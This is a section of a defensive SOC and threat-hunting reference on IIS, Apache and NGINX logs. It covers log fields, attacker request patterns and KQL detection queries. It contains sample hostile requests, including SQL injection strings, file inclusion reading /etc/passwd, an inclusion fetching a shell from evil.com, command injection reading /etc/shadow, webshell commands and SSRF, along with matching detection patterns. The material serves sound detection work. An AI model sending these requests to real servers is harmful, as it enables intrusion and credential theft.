# **Section 8 — Web Server Logs**
_Comprehensive SOC, DFIR & Threat Hunting Reference_

Web server logs are one of the most valuable sources for detecting:
- web exploitation attempts  
- SQL injection (SQLi)  
- LFI/RFI (Local/Remote File Inclusion)  
- brute-force attacks  
- directory enumeration  
- webshell deployment  
- malware downloads  
- HTTP(S)-based C2 traffic  

This section covers the three most common web servers:
- **IIS**
- **Apache**
- **NGINX**

Each includes:
- log format  
- attacker patterns  
- SOC red flags  
- detection examples  
- SIEM queries  

---

# 🧭 **TABLE OF CONTENTS**
- [Overview of Web Server Logs](#-overview-of-web-server-logs)
- [IIS Logs](#-iis-logs)
  - [Log Fields](#-iis-log-fields)
  - [Attacker Patterns](#-iis-attacker-patterns)
  - [Real Examples](#-iis-real-examples)
- [Apache Logs](#-apache-logs)
  - [Common Formats](#-apache-common-formats)
  - [Attacker Patterns](#-apache-attacker-patterns)
- [NGINX Logs](#-nginx-logs)
  - [Default Log Format](#-nginx-default-log-format)
  - [Attacker Patterns](#-nginx-attacker-patterns)
- [Web Exploitation Detection](#-web-exploitation-detection)
- [SIEM Queries](#-siem-detection-queries)

---

# ---
# ## **Overview of Web Server Logs**

Every HTTP request creates a log entry containing:
- HTTP method (GET, POST, PUT, DELETE)
- URL path / API endpoint  
- status code (200, 404, 500…)  
- user agent  
- source IP  
- bytes sent/received  
- execution time  

Web logs are critical for:
- incident response  
- identifying exploitation attempts  
- tracing attacker movement  
- detecting webshells  

---

# ---
# ## **IIS Logs**

IIS logs are stored here:
```
C:\inetpub\logs\LogFiles\W3SVC1\
```

---

# ### **IIS Log Fields**
The most common IIS fields:

| Field | Meaning |
|-------|----------|
| **cs-method** | HTTP method (GET/POST/etc.) |
| **cs-uri-stem** | URL path |
| **cs-uri-query** | Query string |
| **sc-status** | HTTP status code |
| **sc-substatus** | Detailed status |
| **sc-win32-status** | Windows error code |
| **cs-username** | Authenticated user |
| **c-ip** | Client IP |
| **time-taken** | Request processing time |

---

# ### **IIS Attacker Patterns**

### **1️⃣ SQL Injection**
```
GET /login.aspx?id=1 OR 1=1--
GET /product.aspx?id=' UNION SELECT username,password FROM users--
```

### **2️⃣ Local File Inclusion (LFI)**
```
GET /index.php?page=../../../../etc/passwd
```

### **3️⃣ Remote File Inclusion (RFI)**
```
GET /index.php?page=http://evil.com/shell.txt
```

### **4️⃣ Webshell Uploads**
```
POST /upload.aspx  → sc-status: 200
filename=shell.aspx
```

### **5️⃣ Webshell Execution**
```
GET /images/shell.aspx?cmd=whoami
```

### **6️⃣ Directory Bruteforce**
```
GET /admin/
GET /phpmyadmin/
GET /.git/
GET /backup.zip
```

### **7️⃣ Exploit Scanners**
User agent:
```
Mozilla/5.0 sqlmap
nmap
curl
python-requests
```

---

# ### **IIS Real Examples**

### **SQL Injection**
```
2023-11-01 12:31:55 GET /product.aspx id=1%20OR%201=1-- - 80 - 185.220.102.4 Mozilla/5.0 500 0 0 45
```

### **Webshell Execution**
```
GET /uploads/cmd.aspx?exec=whoami 200 0 0
```

### **Directory Enumeration**
```
GET /admin/ HTTP/1.1 404
GET /admin/login HTTP/1.1 404
GET /admin/config HTTP/1.1 404
```

---

# ---
# ## **Apache Logs**

Apache logs are typically stored in:
```
/var/log/apache2/access.log
/var/log/apache2/error.log
```

---

# ### **Apache Common Formats**

### **Combined Log Format**
```
127.0.0.1 - frank [10/Oct/2024:13:55:36 +0200] "GET /apache_pb.gif HTTP/1.0" 200 2326 "http://example.com/start.html" "Mozilla/4.08"
```

Breakdown:
- IP address  
- user identity  
- timestamp  
- request line  
- status code  
- size  
- referrer  
- user agent  

---

# ### **Apache Attacker Patterns**

### **1️⃣ Brute Force / Enumeration**
```
GET /admin/
GET /wp-login.php
GET /server-status
```

### **2️⃣ File Inclusion**
```
GET /index.php?page=/etc/passwd
```

### **3️⃣ Command Injection**
```
GET /ping.php?ip=8.8.8.8;cat /etc/shadow
```

### **4️⃣ Webshell Upload**
```
POST /upload.php
Content-Disposition: form-data; filename="shell.php"
```

### **5️⃣ Botnet Scanning**
User agents:
- `masscan`
- `nikto`
- `curl`
- `python-requests`

---

# ---
# ## **NGINX Logs**

NGINX logs are typically found at:
```
/var/log/nginx/access.log
/var/log/nginx/error.log
```

---

# ### **NGINX Default Log Format**

Default access log:
```
$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent"
```

Example:
```
185.220.101.4 - - [10/Nov/2024:16:11:02 +0200] "GET /api/login HTTP/1.1" 500 812 "-" "Mozilla/5.0"
```

---

# ### **NGINX Attacker Patterns**

### **1️⃣ API Abuse**
```
POST /api/login — 401  
POST /api/login — 401  
POST /api/login — 200  
```

### **2️⃣ Command Injection**
```
GET /status?cmd=cat /etc/passwd
```

### **3️⃣ SSRF Attempts**
```
GET /api/fetch?url=http://127.0.0.1:3306
```

### **4️⃣ File Uploads**
```
POST /upload HTTP/1.1 200
filename=shell.jsp
```

### **5️⃣ Webshell Execution**
```
GET /files/shell.jsp?cmd=id
```

---

# ---
# ## **Web Exploitation Detection**

### **1️⃣ HTTP Method Abuse**
- PUT (upload)
- DELETE (rare)
- POST to unknown endpoints

### **2️⃣ High 500/404 Ratio**
Attackers probing the app.

### **3️⃣ Long URLs**
Often indicate:
- encoded payloads  
- SQLi  
- command injection  

### **4️⃣ Query Strings with Payloads**
Examples:
- `%27 OR 1=1--`  
- `%3B cat /etc/passwd`  
- `../../../../../etc/passwd`  

### **5️⃣ High frequency from single IP**
Bot scanning.

### **6️⃣ Requests without User-Agent**
Automation scripts.

### **7️⃣ Requests to admin endpoints**
```
/admin
/admin/login
/admin/config
```

---

# ---
# ## **SIEM Detection Queries**

### **KQL — Detect SQL Injection Attempts**
```kql
WebLogs
| where Url contains "union" 
   or Url contains "select"
   or Url contains "1=1"
   or Url contains "--"
```

### **KQL — Detect LFI / RFI**
```kql
WebLogs
| where Url contains "../"
   or Url contains "/etc/passwd"
   or Url contains "http://"
```

### **KQL — Detect Webshell Execution**
```kql
WebLogs
| where Url endswith ".php" or Url endswith ".aspx" or Url endswith ".jsp"
| where Url contains "cmd=" or Url contains "exec="
```

### **KQL — Detect High Rate of 404 Errors**
```kql
WebLogs
| where Status == 404
| summarize count() by SourceIP
| where count_ > 20
```

### **KQL — Detect Scanning Frameworks**
```kql
WebLogs
| where UserAgent contains_any ("nikto","sqlmap","curl","python-requests")
```

---

# 🎯 **End of Section 8**
This section gives SOC analysts and detection engineers full visibility into web exploitation activity across IIS, Apache, and NGINX logs, including webshell behavior, SQLi, LFI/RFI, and attacker patterns.

---

### ➡️ Next: [Section 9 — Cloud Logs](./09_cloud_logs.md)
